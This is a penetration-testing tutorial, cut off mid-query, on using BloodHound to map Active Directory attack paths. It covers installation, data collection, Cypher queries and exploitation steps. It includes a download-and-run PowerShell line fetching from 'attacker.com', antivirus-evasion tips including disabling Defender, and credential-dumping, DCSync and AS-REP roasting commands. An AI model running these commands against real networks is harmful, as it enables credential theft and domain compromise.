
## Table of Contents
1. [Prerequisites & Installation](#prerequisites--installation)
2. [Initial Setup & Configuration](#initial-setup--configuration)
3. [Data Collection (Step-by-Step)](#data-collection-step-by-step)
4. [Importing & Analyzing Data](#importing--analyzing-data)
5. [Finding Attack Paths](#finding-attack-paths)
6. [Exploitation Walkthroughs](#exploitation-walkthroughs)
7. [Advanced Techniques](#advanced-techniques)
8. [Defensive Hardening](#defensive-hardening)

---

## Prerequisites & Installation

### What You Need

#### For Red Team / Penetration Testing:
- **Attacker Machine:** Kali Linux, Ubuntu, or Windows
- **Target Environment:** Active Directory domain
- **Credentials:** Valid domain user account (any user will work)
- **Network Access:** Ability to reach domain controller on ports 389 (LDAP), 445 (SMB)

#### System Requirements:
- **RAM:** Minimum 4GB (8GB+ recommended for large environments)
- **Disk Space:** 5GB free (more for large domains)
- **Java:** Version 11 or higher (for Neo4j)
- **Python:** Version 3.6+ (for bloodhound-python)

---

### Step 1: Install Prerequisites

#### Option A: Kali Linux (Easiest - Recommended for Beginners)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Java (required for Neo4j)
sudo apt install -y openjdk-11-jdk

# Verify Java installation
java -version
# Should show: openjdk version "11.x.x"

# Install Neo4j (graph database)
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable latest' | sudo tee /etc/apt/sources.list.d/neo4j.list
sudo apt update
sudo apt install -y neo4j

# Install BloodHound GUI
sudo apt install -y bloodhound

# Install bloodhound-python (data collector)
sudo apt install -y bloodhound.py
# Or via pip:
pip3 install bloodhound

# Install supporting tools
sudo apt install -y crackmapexec nmap
```

#### Option B: Ubuntu / Debian

```bash
# Same as Kali Linux instructions above
# All commands are identical
```

#### Option C: Windows 10/11

**Install Java:**
1. Download OpenJDK 11 from: https://adoptium.net/
2. Run installer, accept defaults
3. Verify: Open PowerShell → `java -version`

**Install Neo4j Desktop (Easier than command-line version):**
1. Download from: https://neo4j.com/download-center/#desktop
2. Run installer, create account (free)
3. Launch Neo4j Desktop

**Install BloodHound GUI:**
1. Download latest release: https://github.com/BloodHoundAD/BloodHound/releases/latest
2. Download `BloodHound-win32-x64.zip`
3. Extract to `C:\Tools\BloodHound\`

**Install SharpHound (Windows collector):**
1. Download from same releases page
2. Download `SharpHound-vX.X.X.zip`
3. Extract `SharpHound.exe` to `C:\Tools\`

**Install Python & bloodhound-python (Optional for Windows):**
1. Download Python 3.11 from: https://www.python.org/downloads/
2. Install (check "Add Python to PATH")
3. Open PowerShell:
   ```powershell
   pip install bloodhound
   ```

---

### Step 2: Verify Installation

#### Linux/Kali Verification:

```bash
# Check Neo4j
sudo systemctl status neo4j
# Should show: active (running)

# Check BloodHound
which bloodhound
# Should show: /usr/bin/bloodhound

# Check bloodhound-python
bloodhound-python --help
# Should show help menu

# Check Java
java -version
# Should show version 11+
```

#### Windows Verification:

```powershell
# Check Java
java -version

# Check Neo4j Desktop
# Launch application - should open GUI

# Check BloodHound
cd C:\Tools\BloodHound\
.\BloodHound.exe --help

# Check SharpHound
cd C:\Tools\
.\SharpHound.exe --help
```

---

## Initial Setup & Configuration

### Step 3: Configure Neo4j Database

#### Linux/Kali Configuration:

```bash
# Start Neo4j service
sudo systemctl start neo4j

# Enable Neo4j to start on boot (optional)
sudo systemctl enable neo4j

# Check Neo4j is running
sudo systemctl status neo4j
# Should show: active (running)

# Neo4j will be accessible at: http://localhost:7474
```

**First-Time Neo4j Setup (IMPORTANT):**

1. Open web browser
2. Navigate to: `http://localhost:7474`
3. You'll see Neo4j Browser login screen

   **Default Credentials:**
   - Username: `neo4j`
   - Password: `neo4j`

4. **You MUST change the password on first login**
   - New password suggestion: `BloodHound` or `bloodhound123!`
   - **REMEMBER THIS PASSWORD** - you'll need it for BloodHound GUI

5. Once logged in, you'll see the Neo4j browser interface
   - This confirms database is working
   - You can close this window

#### Windows Configuration (Neo4j Desktop):

1. Launch Neo4j Desktop application
2. Click "New" → "Create Project"
3. Name it: `BloodHound`
4. Click "Add Database" → "Local DBMS"
5. Configure:
   - Name: `BloodHound`
   - Password: `bloodhound123!` (or your choice)
   - Version: 4.4.x (latest)
6. Click "Create"
7. Click "Start" button
8. Wait for status to show "Active" (green dot)

---

### Step 4: Increase Neo4j Performance (Recommended)

#### Linux - Edit Neo4j Configuration:

```bash
# Stop Neo4j
sudo systemctl stop neo4j

# Edit configuration file
sudo nano /etc/neo4j/neo4j.conf
```

**Add/modify these lines:**

```conf
# Uncomment and set these values:

# Initial heap size (RAM allocation)
dbms.memory.heap.initial_size=2g

# Maximum heap size
dbms.memory.heap.max_size=4g

# Page cache (faster queries)
dbms.memory.pagecache.size=2g

# Allow connections from BloodHound GUI
dbms.connector.bolt.listen_address=0.0.0.0:7687
dbms.connector.http.listen_address=0.0.0.0:7474

# Uncomment to allow remote connections (if needed)
# dbms.default_listen_address=0.0.0.0
```

**Save and exit:**
- Press `Ctrl+X`
- Press `Y` to confirm
- Press `Enter`

```bash
# Start Neo4j with new configuration
sudo systemctl start neo4j

# Verify it's running
sudo systemctl status neo4j
```

#### Windows - Neo4j Desktop Performance:

1. In Neo4j Desktop, click on your database (don't start it yet)
2. Click "..." (three dots) → "Settings"
3. Find these settings and modify:

   ```
   dbms.memory.heap.initial_size=2g
   dbms.memory.heap.max_size=4g
   dbms.memory.pagecache.size=2g
   ```

4. Click "Apply"
5. Start the database

---

### Step 5: Launch BloodHound GUI & Connect

#### Linux Launch:

```bash
# Start BloodHound GUI
bloodhound &

# Alternative: If above doesn't work
cd /usr/share/bloodhound-ui/
npm start
```

#### Windows Launch:

```powershell
# Navigate to BloodHound directory
cd C:\Tools\BloodHound\

# Launch BloodHound
.\BloodHound.exe
```

#### First-Time BloodHound Login:

When BloodHound GUI opens, you'll see a login screen:

**Connection Details:**
- **Database URL:** `bolt://localhost:7687` (default, don't change)
- **Username:** `neo4j`
- **Password:** `[the password you set in Step 3]`

**Example:**
```
Database URL: bolt://localhost:7687
Username:     neo4j
Password:     bloodhound123!
```

Click **"Login"**

✅ **Success indicators:**
- GUI opens to main interface
- Top bar shows "Database Info" with connection status
- No error messages

❌ **If connection fails:**
- Verify Neo4j is running: `sudo systemctl status neo4j` (Linux) or check Neo4j Desktop (Windows)
- Verify password is correct
- Check firewall isn't blocking port 7687

---

## Data Collection (Step-by-Step)

### Understanding Collection Methods

Before collecting, understand what each method does:

| Method | What It Collects | Network Noise | Admin Required |
|--------|-----------------|---------------|----------------|
| `DCOnly` | Domain trusts, policies | Very Low | No |
| `Group` | Group memberships | Low | No |
| `LocalAdmin` | Local admin rights (via GPO) | Medium | No |
| `Session` | Logged-on users (live sessions) | High | Partial* |
| `LoggedOn` | Currently logged-on users | High | Yes |
| `ACL` | Permissions & ACLs | Medium | No |
| `Trusts` | Domain trust relationships | Low | No |
| `All` | Everything above | High | Partial* |

*Session collection works partially with user privileges, fully with admin

---

### Step 6: Collect Data with bloodhound-python (Linux - Remote Collection)

#### Scenario: You're on Kali, target is Windows AD domain

**What you need to know:**
- Domain name (e.g., `corp.local`)
- Domain Controller IP (e.g., `192.168.1.10`)
- Valid domain credentials (e.g., `john.doe` / `Password123`)

#### Basic Collection (Recommended for First Time):

```bash
# Navigate to a working directory
cd ~/Documents
mkdir bloodhound-data
cd bloodhound-data

# Collect ALL data (most comprehensive)
bloodhound-python -u 'john.doe' -p 'Password123' -d corp.local -ns 192.168.1.10 -c All --zip

# Expected output:
# INFO: Found AD domain: corp.local
# INFO: Connecting to LDAP server: dc01.corp.local
# INFO: Found 1 domains
# INFO: Found 1 domains in the forest
# INFO: Found 1 computers
# INFO: Connecting to LDAP server: dc01.corp.local
# INFO: Found 50 users
# INFO: Found 35 groups
# INFO: Found 0 trusts
# INFO: Starting computer enumeration with 10 workers
# INFO: Querying computer: DC01.corp.local
# INFO: Done in 00M 45S
```

**Output files:**
- `20251024180249_computers.json`
- `20251024180249_users.json`
- `20251024180249_groups.json`
- `20251024180249_domains.json`
- `20251024180249_bloodhound.zip` ← **This is what you'll import**

#### Alternative Authentication Methods:

**Using NTLM Hash (if you have it):**
```bash
bloodhound-python -u 'john.doe' --hashes ':aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' -d corp.local -ns 192.168.1.10 -c All --zip
```

**Using Kerberos (if you have a ticket):**
```bash
# First, set up Kerberos ticket (from previous attack)
export KRB5CCNAME=/tmp/john.doe.ccache

# Collect with Kerberos
bloodhound-python -u 'john.doe' -k -d corp.local -ns 192.168.1.10 -c All --zip
```

**Using Different Domain Format:**
```bash
# Format 1: username only (assumes domain from -d flag)
bloodhound-python -u 'john.doe' -p 'Password123' -d corp.local -ns 192.168.1.10 -c All --zip

# Format 2: domain\username
bloodhound-python -u 'CORP\john.doe' -p 'Password123' -d corp.local -ns 192.168.1.10 -c All --zip

# Format 3: user@domain
bloodhound-python -u 'john.doe@corp.local' -p 'Password123' -d corp.local -ns 192.168.1.10 -c All --zip
```

#### Stealth Collection (Less Noisy):

```bash
# Minimal collection (fastest, quietest)
bloodhound-python -u 'john.doe' -p 'Password123' -d corp.local -ns 192.168.1.10 -c DCOnly,Group --zip

# No session enumeration (reduces SMB traffic)
bloodhound-python -u 'john.doe' -p 'Password123' -d corp.local -ns 192.168.1.10 -c Group,LocalAdmin,ACL --zip
```

#### Troubleshooting Collection Issues:

**Problem: "Name resolution failed"**
```bash
# Solution: Use explicit DC and DNS
bloodhound-python -u 'john.doe' -p 'Password123' -d corp.local -dc DC01.corp.local -ns 192.168.1.10 -c All --zip
```

**Problem: "Clock skew too great" (Kerberos error)**
```bash
# Solution: Sync time with DC
sudo ntpdate -u 192.168.1.10
# Or
sudo timedatectl set-ntp true
```

**Problem: "Authentication failed"**
```bash
# Test credentials first with LDAP query
ldapsearch -x -H ldap://192.168.1.10 -D "john.doe@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(objectClass=user)" cn

# If this works, bloodhound-python should work
```

**Problem: Empty JSON files / no data collected**
```bash
# Check network connectivity
nc -zv 192.168.1.10 389  # LDAP
nc -zv 192.168.1.10 445  # SMB

# Try with verbose output
bloodhound-python -u 'john.doe' -p 'Password123' -d corp.local -ns 192.168.1.10 -c All --zip -v

# Try specifying DC by IP instead of hostname
bloodhound-python -u 'john.doe' -p 'Password123' -d corp.local -ns 192.168.1.10 --dc 192.168.1.10 -c All --zip
```

---

### Step 7: Collect Data with SharpHound (Windows - Local Collection)

#### Scenario: You have access to a Windows machine on the domain

**When to use SharpHound:**
- You have a Windows machine on the domain
- You want faster, more complete collection
- You want session data (requires local execution)

#### Basic Collection:

**PowerShell Method (Easiest):**

```powershell
# Navigate to SharpHound directory
cd C:\Tools\

# Run SharpHound (basic)
.\SharpHound.exe -c All

# Expected output:
# 2025-10-24T18:02:49.1234567-00:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
# 2025-10-24T18:02:49.2345678-00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
# 2025-10-24T18:02:49.3456789-00:00|INFORMATION|Initializing SharpHound at 6:02 PM on 10/24/2025
# ...
# 2025-10-24T18:05:32.4567890-00:00|INFORMATION|SharpHound Enumeration Completed at 6:05 PM on 10/24/2025! Happy Graphing!

# Output file will be named something like:
# 20251024180249_BloodHound.zip
```

#### Advanced SharpHound Options:

**Custom Output Name:**
```powershell
.\SharpHound.exe -c All --zipfilename corp_audit.zip
```

**Specify Domain & DC:**
```powershell
.\SharpHound.exe -c All -d corp.local --domaincontroller DC01.corp.local
```

**Loop Collection (Collect multiple times to catch sessions):**
```powershell
# Run for 2 hours, collect every 10 minutes
.\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:10:00
```

**Stealth Mode (Slower but quieter):**
```powershell
.\SharpHound.exe -c All --Stealth --Throttle 5000 --Jitter 20
# Adds 5 second delay between requests with 20% random variation
```

**Exclude Domain Controllers (Less risky):**
```powershell
.\SharpHound.exe -c All --ExcludeDCs
```

#### PowerShell Script Method:

```powershell
# Download SharpHound.ps1 (PowerShell version)
# From: https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1

# Import the module
Import-Module .\SharpHound.ps1

# Run collection
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp\

# With specific parameters
Invoke-BloodHound -CollectionMethod All -Domain corp.local -LdapUsername 'john.doe' -LdapPassword 'Password123' -OutputDirectory C:\Temp\
```

#### OPSEC Considerations for SharpHound:

**Avoiding Detection:**

```powershell
# 1. Run from memory (more evasive)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All

# 2. Rename executable (basic AV evasion)
cp SharpHound.exe Update.exe
.\Update.exe -c All

# 3. Use during business hours (blend with normal traffic)
# Schedule for 2 PM on a Tuesday

# 4. Exclude noisy methods
.\SharpHound.exe -c Group,LocalAdmin,ACL,Trusts
# Skips Session and LoggedOn (most detectable)

# 5. Disable output (if testing AV detection)
.\SharpHound.exe -c All --NoZip --OutputDirectory C:\Windows\Temp\
```

#### Troubleshooting SharpHound:

**Problem: "Access Denied" errors**
```powershell
# Check current user context
whoami
# Ensure you're running as domain user, not local user

# Try with explicit credentials
.\SharpHound.exe -c All --LdapUsername 'CORP\john.doe' --LdapPassword 'Password123'
```

**Problem: SharpHound won't run (blocked by AV/EDR)**
```powershell
# Option 1: Disable AV (if authorized)
Set-MpPreference -DisableRealtimeMonitoring $true

# Option 2: Add exclusion
Add-MpPreference -ExclusionPath "C:\Tools\"

# Option 3: Use obfuscated version (custom compile)
# Download source: https://github.com/BloodHoundAD/SharpHound
# Modify strings, recompile with Visual Studio

# Option 4: Use bloodhound-python instead (from Kali)
```

**Problem: Slow collection / timing out**
```powershell
# Increase timeouts
.\SharpHound.exe -c All --LdapTimeout 120 --LdapPingTimeout 60

# Reduce concurrent tasks
.\SharpHound.exe -c All --Threads 5
# Default is 10 threads
```

---

## Importing & Analyzing Data

### Step 8: Import Data into BloodHound

#### Method 1: GUI Upload (Easiest)

**Linux:**
1. Ensure BloodHound GUI is open and connected to Neo4j
2. Look at top-right corner → Click **"Upload Data"** button (upload icon)
3. File browser opens
4. Navigate to your data directory:
   - bloodhound-python: `~/Documents/bloodhound-data/`
   - SharpHound: `C:\Tools\` or wherever you ran it
5. Select the `.zip` file:
   - Example: `20251024180249_bloodhound.zip`
6. Click **"Open"**

**Progress indicators:**
- Bottom-right corner shows upload progress
- "Parsing JSON files..."
- "Users: 50/50"
- "Computers: 25/25"
- etc.

**Completion:**
- Green notification: "Upload Complete"
- Data is now queryable

#### Method 2: Drag & Drop (Alternative)

1. Open BloodHound GUI
2. Open file manager
3. Navigate to ZIP file
4. **Drag ZIP file** directly into BloodHound window
5. Upload begins automatically

#### Method 3: Import Individual JSON Files

If you have unzipped JSON files:

1. Click "Upload Data"
2. Hold `Ctrl` (Windows/Linux) or `Cmd` (Mac)
3. Select multiple JSON files:
   - `computers.json`
   - `users.json`
   - `groups.json`
   - `domains.json`
4. Click "Open"

#### Verify Import Success:

**Check 1: Database Info**
1. Click **"Database Info"** (ⓘ icon) in top-right
2. You should see:
   ```
   Users: 50
   Groups: 35
   Computers: 25
   OUs: 10
   GPOs: 5
   Domains: 1
   
   Sessions: 15
   ACLs: 1,250
   Relationships: 3,500
   ```

**Check 2: Search Box**
1. Click search box (top-left)
2. Type: `domain admins`
3. Select: "DOMAIN ADMINS@CORP.LOCAL" (group)
4. Group node appears in graph view

✅ If node appears: Import successful!

---

### Step 9: Understanding the BloodHound Interface

#### Main Interface Components:

```
┌──────────────────────────────────────────────────────────────┐
│ [Search Box]     [☰ Menu]              [↻] [🗑️] [ⓘ] [⬆️]     │  ← Top Bar
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────┐                                            │
│  │ Pre-Comp.   │           Main Graph View                  │
│  │ Queries     │         (Visual Representation)            │
│  │             │                                            │
│  │ • Find Path │              ┌──────┐                      │
│  │   to DA     │      ┌──────►│ DA   │                      │
│  │             │      │       └──────┘                      │
│  │ • Kerberoast│      │                                     │
│  │             │  ┌───┴───┐                                 │
│  │ • Sessions  │  │ User  │                                 │
│  │             │  └───────┘                                 │
│  └─────────────┘                                            │
│                                                              │
├──────────────────────────────────────────────────────────────┤
│ Node Info Panel                                              │  ← Bottom Panel
│ Name: john.doe@corp.local                                    │
│ Properties: [Shows when you click a node]                    │
└──────────────────────────────────────────────────────────────┘
```

#### Top Bar Icons (Right Side):

| Icon | Function | What It Does |
|------|----------|--------------|
| 🔄 | Refresh | Reload graph layout |
| 🗑️ | Clear | Remove all nodes from view |
| ⓘ | Database Info | Show database statistics |
| ⬆️ | Upload Data | Import new BloodHound data |
| ⚙️ | Settings | Configure BloodHound options |

#### Left Panel: Pre-Computed Queries

**Click the hamburger menu (☰) to open:**

Categories:
1. **Domain Information**
   - List all Domain Admins
   - Find all High Value Targets

2. **Shortest Paths**
   - Find Shortest Paths to Domain Admins
   - Find Shortest Paths to High Value Targets

3. **Kerberos Attacks**
   - List all Kerberoastable Accounts
   - Find AS-REP Roastable Users
   - Find Computers with Unconstrained Delegation

4. **Local Admin Rights**
   - Find Computers where Domain Users are Local Admin
   - Find Computers where Domain Users Can RDP

5. **Dangerous Permissions**
   - Find Dangerous Rights for Domain Users
   - Find Principals with DCSync Rights

---

### Step 10: Your First Query - Finding Path to Domain Admins

**Goal:** Find how a compromised user can reach Domain Admin privileges

#### Step-by-Step:

**1. Open Pre-Computed Queries:**
- Click hamburger menu (☰) in top-left
- Panel slides out from left side

**2. Select Query:**
- Expand **"Shortest Paths"** section
- Click: **"Find Shortest Paths to Domain Admins"**

**3. Select Starting User:**
- Popup appears: "Select a user"
- In search box, type the username you compromised
- Example: `john.doe` or `jdoe`
- Select: "JOHN.DOE@CORP.LOCAL"
- Click "Submit" or press Enter

**4. Results Appear:**

You'll see one of two outcomes:

**Outcome A: No Paths Found**
```
[Empty graph view]
Bottom shows: "No paths found"
```
✅ This means John Doe has no direct path to Domain Admins (good for security!)

**Outcome B: Paths Found**
```
Visual graph showing connection chain:

[JOHN.DOE@CORP.LOCAL] 
    ↓ MemberOf
[IT-HELPDESK@CORP.LOCAL]
    ↓ GenericWrite
[ADMIN-USER@CORP.LOCAL]
    ↓ MemberOf
[DOMAIN ADMINS@CORP.LOCAL]
```

#### Reading the Graph:

**Nodes (Circles/Icons):**
- 👤 User icon = User account
- 👥 Multiple users icon = Group
- 🖥️ Computer icon = Computer object
- 🏰 Castle icon = Domain

**Node Colors:**
- 🔴 Red = Owned by you (marked as compromised)
- 🟠 Orange = High Value Target
- 🔵 Blue = Regular object
- 🟢 Green = Starting point

**Edges (Arrows):**
- Lines connecting nodes
- Label shows relationship type
- Hover over edge to see details

**Common Edge Types:**
| Edge | Meaning | Exploitable? |
|------|---------|--------------|
| MemberOf | User is in group | No (informational) |
| AdminTo | Has local admin on computer | Yes - Remote code execution |
| CanRDP | Can RDP to computer | Yes - Remote desktop access |
| GenericAll | Full control over object | Yes - Modify any property |
| GenericWrite | Write any property | Yes - Add SPN, change settings |
| ForceChangePassword | Can reset password | Yes - Take over account |
| WriteDacl | Modify permissions | Yes - Grant yourself more rights |

---

### Step 11: Analyzing a Node

**Click on any node to see detailed information**

#### Example: Clicking on a User Node

**Node Info Panel (Bottom) Shows:**

```
┌─────────────────────────────────────────────────────┐
│ JOHN.DOE@CORP.LOCAL                                 │
│ Type: User                                          │
├─────────────────────────────────────────────────────┤
│ OVERVIEW:                                           │
│ • Display Name: John Doe                            │
│ • Email: john.doe@corp.local                        │
│ • Enabled: Yes                                      │
│ • Password Last Set: 2024-06-15 14:23:11            │
│ • Last Logon: 2025-10-24 09:15:32                   │
│ • Admin Count: 0                                    │
│ • Has SPN: No                                       │
│                                                     │
│ SESSIONS (Tabs):                                    │
│ ├─ Node Info    (Current view)                      │
│ ├─ Group Membership  (Groups user belongs to)       │
│ ├─ Local Admin Rights (Computers user has admin on) │
│ ├─ Execution Rights (RDP, DCOM, etc.)              │
│ ├─ Outbound Control Rights (What user can control)  │
│ ├─ Inbound Control Rights (Who can control user)    │
└─────────────────────────────────────────────────────┘
```

#### Important Tabs to Check:

**Tab 1: Node Info**
- Basic information about the object
- Look for:
  - `Has SPN: Yes` → Kerberoastable
  - `Password Last Set:` → Old date = potentially weak password
  - `Admin Count: 1` → Has elevated privileges

**Tab 2: Group Membership**
- Shows all groups user is a member of
- Click "Unroll" to see nested groups
- Look for admin groups:
  - Domain Admins
  - Enterprise Admins
  - Server Operators
  - Backup Operators

**Tab 3: Local Admin Rights**
- Computers where this user has local admin
- Click a computer to see attack path
- **Exploitation:** Can run commands, dump credentials on these systems

**Tab 4: Execution Rights**
- RDP, DCOM, PSRemote permissions
- **Exploitation:** Alternative remote access methods

**Tab 5: Outbound Control Rights**
- Objects this user can modify/control
- Look for:
  - GenericAll, GenericWrite on users (password reset, SPN modification)
  - WriteDacl (permission modification)
  - ForceChangePassword (immediate takeover)
  - AddMember (add to groups)

**Tab 6: Inbound Control Rights**
- Who can control THIS user
- **Defensive:** Identify who can compromise this account

---

### Step 12: Marking Nodes as Owned

**Purpose:** Track your progress during an engagement

#### How to Mark as Owned:

**Method 1: Right-Click**
1. Right-click on the compromised user node
2. Select: **"Mark User as Owned"**
3. Node icon changes to skull 💀 and turns red 🔴

**Method 2: Node Info Panel**
1. Click on user node
2. In Node Info panel (bottom), find "Mark as Owned" checkbox
3. Check the box

#### Why Mark Owned Nodes:

**Benefit 1: Find Next Steps**
```
Query: "Find Shortest Paths from Owned Principals to Domain Admins"
```
- Shows paths from ALL your owned accounts
- Helps identify best route to DA

**Benefit 2: Track Campaign Progress**
- Visual reminder of access level
- Document for report writing

**Benefit 3: Find Unprotected High-Value Targets**
```
Query: "Find Shortest Paths from Owned Principals to High Value Targets"
```
- Identify other sensitive systems reachable from current access

#### Custom Query for Owned Nodes:

**In search bar, click "Raw Query" at bottom:**

```cypher
MATCH (o {owned:true})
RETURN o
```
Shows all owned nodes

```cypher
MATCH (o {owned:true})
MATCH (g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
MATCH p=shortestPath((o)-[*1..]->(g))
RETURN p
```
Shows paths from ANY owned node to Domain Admins

---

### Step 13: Setting Custom High-Value Targets

**Default high-value targets:**
- Domain Admins
- Enterprise Admins
- Domain Controllers
- Administrators

**Adding Custom Targets:**

#### Why Set Custom Targets:
- Organization-specific sensitive accounts
- Executive accounts (CEO, CFO)
- Service accounts with broad access
- Critical servers (SQL, file servers)

#### How to Set High-Value:

**Method 1: Via GUI**
1. Click on node (user, computer, or group)
2. In Node Info panel, find "High Value" checkbox
3. Check the box
4. Node turns orange 🟠

**Method 2: Via Cypher Query**

**Mark specific user as high-value:**
```cypher
MATCH (u:User {name:'CEO@CORP.LOCAL'})
SET u.highvalue = true
RETURN u
```

**Mark all executive accounts:**
```cypher
MATCH (u:User)
WHERE u.name =~ '(?i).*(ceo|cfo|cto|president|executive).*'
SET u.highvalue = true
RETURN u
```

**Mark SQL servers:**
```cypher
MATCH (c:Computer)
WHERE c.name =~ '(?i).*sql.*'
SET c.highvalue = true
RETURN c
```

**Find paths to custom targets:**
- Pre-computed query: "Find Shortest Paths to High Value Targets"
- Now includes your custom-marked targets

---

## Finding Attack Paths

### Step 14: Using Pre-Computed Queries

**Access:** Click hamburger menu (☰) → Query category

#### Query 1: Find Shortest Paths to Domain Admins

**Steps:**
1. Click: "Shortest Paths" → "Find Shortest Paths to Domain Admins"
2. Select starting user (compromised account)
3. Analyze path shown

**Example Result:**
```
JOHN.DOE@CORP.LOCAL
  → MemberOf → IT-SUPPORT@CORP.LOCAL
  → GenericWrite → HELPDESK-ADMIN@CORP.LOCAL
  → AdminTo → FILE-SERVER01.CORP.LOCAL
  → HasSession → DA-ACCOUNT@CORP.LOCAL
  → MemberOf → DOMAIN ADMINS@CORP.LOCAL
```

**Attack Plan:**
1. We ARE john.doe ✓
2. We're in IT-Support group ✓ (automatic)
3. Exploit GenericWrite to compromise helpdesk-admin
4. Use helpdesk-admin to access FILE-SERVER01
5. Dump credentials on FILE-SERVER01 to get DA-ACCOUNT
6. Authenticate as DA-ACCOUNT = Domain Admin ✓

---

#### Query 2: Find Kerberoastable Accounts

**Steps:**
1. Click: "Kerberos Attacks" → "List all Kerberoastable Accounts"
2. List of users with SPNs appears

**What You See:**
```
Users with SPNs (Kerberoastable):
• SQLSERVICE@CORP.LOCAL (Has SPN: MSSQLSvc/SQL01.corp.local:1433)
• WEBSERVICE@CORP.LOCAL (Has SPN: HTTP/web01.corp.local)
• BACKUPSERVICE@CORP.LOCAL (Has SPN: backupexec/backup01.corp.local)
```

**Click on each user to see:**
- Password Last Set date (older = potentially weaker password)
- Group memberships (is this account an admin somewhere?)
- Admin rights (can we use this account for lateral movement?)

**Prioritization:**
1. Old passwords (> 2 years since password change)
2. Accounts with admin rights
3. Accounts in high-value groups

---

#### Query 3: Find Computers Where Domain Users Are Local Admin

**Steps:**
1. Click: "Local Admin Rights" → "Find Computers where Domain Users are Local Admin"
2. Shows computers with misconfiguration

**Why This Matters:**
- "Domain Users" group contains ALL domain users
- If Domain Users has local admin anywhere, ANY compromised account can exploit it

**Exploitation:**
```powershell
# If you see: WORKSTATION05.CORP.LOCAL has Domain Users as local admin

# From Kali:
crackmapexec smb 192.168.1.105 -u 'john.doe' -p 'Password123' -x "whoami"
# Output: corp\john.doe (confirms admin access)

# Dump credentials:
crackmapexec smb 192.168.1.105 -u 'john.doe' -p 'Password123' --sam
# Extracts local account hashes

secretsdump.py 'corp/john.doe:Password123@192.168.1.105'
# Dumps all credentials from system
```

---

#### Query 4: Find Principals with DCSync Rights

**Steps:**
1. Click: "Dangerous Permissions" → "Find Principals with DCSync Rights"
2. Shows users/groups that can perform DCSync attack

**What is DCSync:**
- Ability to request password hashes from Domain Controller
- Simulates domain controller replication
- No need to log onto DC or dump memory

**If You Have DCSync Rights:**
```bash
# From Kali with compromised account that has DCSync:
secretsdump.py 'corp/compromised-user:password@192.168.1.10' -just-dc
# Dumps ALL domain password hashes, including krbtgt

# Specifically dump krbtgt for golden ticket:
secretsdump.py 'corp/compromised-user:password@192.168.1.10' -just-dc-user krbtgt
```

---

#### Query 5: Find AS-REP Roastable Users

**Steps:**
1. Click: "Kerberos Attacks" → "Find AS-REP Roastable Users (DontReqPreAuth)"
2. Shows users with "Do not require Kerberos preauthentication" enabled

**What is AS-REP Roasting:**
- Users with this setting don't need pre-authentication
- Can request authentication data WITHOUT valid credentials
- Response contains encrypted data (crackable offline)

**Exploitation:**
```bash
# From Kali:
GetNPUsers.py corp.local/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat -outputfile hashes.txt

# Crack with hashcat:
hashcat -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Or use Rubeus from Windows:
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

---

### Step 15: Writing Custom Cypher Queries

**Cypher = Neo4j's query language (similar to SQL)**

#### Accessing Raw Query Interface:

1. Click search box (top-left)
2. Scroll down to bottom of search dropdown
3. Click: **"Raw Query"** (or press `/` key)
4. Query editor opens at bottom of screen

#### Basic Cypher Syntax:

```cypher
MATCH (n:Label {property:'value'})
RETURN n
```

**Components:**
- `MATCH`: Find nodes/relationships
- `(n:Label)`: Variable name `n`, node type `Label`
- `{property:'value'}`: Filter by property
- `RETURN`: What to show in results

---

#### Example Queries for Beginners:

**Query 1: Find Specific User**
```cypher
MATCH (u:User {name:'JOHN.DOE@CORP.LOCAL'})
RETURN u
```
**Result:** Shows john.doe node in graph

---

**Query 2: Find All Domain Admins**
```cypher
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u
```
**Explanation:**
- `[:MemberOf*1..]`: Follow MemberOf relationships (1 or more hops)
- `*1..`: Handles nested groups (user → group → group → Domain Admins)

---

**Query 3: Find Users with "Password" in Description**
```cypher
MATCH (u:User)
WHERE u.description =~ '(?i).*pass.*'
RETURN u.name, u.description
```
**Explanation:**
- `=~`: Regular expression match
- `(?i)`: Case-insensitive
- `.*pass.*`: Contains "pass" anywhere

**Why This Matters:** Admins sometimes put passwords in user descriptions!

---

**Query 4: Find Computers with Old Operating Systems**
```cypher
MATCH (c:Computer)
WHERE c.operatingsystem =~ '(?i).*(2000|2003|2008|XP|Vista).*'
  AND c.enabled = true
RETURN c.name, c.operatingsystem
ORDER BY c.operatingsystem
```
**Why:** Old OS = easier to exploit

---

**Query 5: Find Path from Specific User to Domain Admins**
```cypher
MATCH (u:User {name:'JOHN.DOE@CORP.LOCAL'}), 
      (g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
      p=shortestPath((u)-[*1..]->(g))
RETURN p
```
**Explanation:**
- `shortestPath()`: Finds shortest route
- `[*1..]`: Any relationship type, any number of hops
- `->`: Direction (john.doe → Domain Admins)

---

**Query 6: Find All Users with Local Admin Rights**
```cypher
MATCH (u:User)-[:AdminTo]->(c:Computer)
RETURN u.name, COUNT(c) AS AdminToCount
ORDER BY AdminToCount DESC
```
**Result:** Ranked list of users by # of computers they admin

---

**Query 7: Find Who Can Reset Passwords**
```cypher
MATCH (u:User)-[:ForceChangePassword]->(target:User)
WHERE target.enabled = true
RETURN u.name AS Attacker, target.name AS Victim, target.admincount AS IsAdmin
```
**Why:** Immediate account takeover opportunity

---

**Query 8: Find Groups with Excessive Permissions**
```cypher
MATCH (g:Group)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(t)
WHERE t.highvalue = true
